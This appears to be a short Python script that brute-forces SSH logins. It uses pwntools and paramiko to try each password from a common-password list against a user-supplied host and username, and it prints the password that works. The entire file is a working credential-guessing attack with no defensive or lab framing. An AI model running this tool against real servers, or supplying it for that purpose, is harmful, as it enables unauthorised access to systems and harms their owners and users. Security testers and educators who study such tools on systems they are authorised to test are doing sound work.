#Automated SSH Brute Forcing Tool
from pwn import * 

import paramiko 
import sys

host = input("Enter the IP Address : \n")
username =input("Enter the username : \n")
attempts =0

with open("ssh-common-passwords.txt","r") as password_list :
    for password in password_list :
        password = password.strip("\n")
        try :
            print("[{}] Attempting password : '{}'!".format(attempts,password))
            response = ssh(host = host, user = username , password = password , timeout =1)
            if response.connected() :
                print("[>] Valid Password found : '{}'!".format(password))
                response.close()
                break
            response.close()
            
        except paramiko.ssh_exception.AuthenticationException :
            print("[X] Invalid Password Detected !")
        attempts +=1
        
        
        
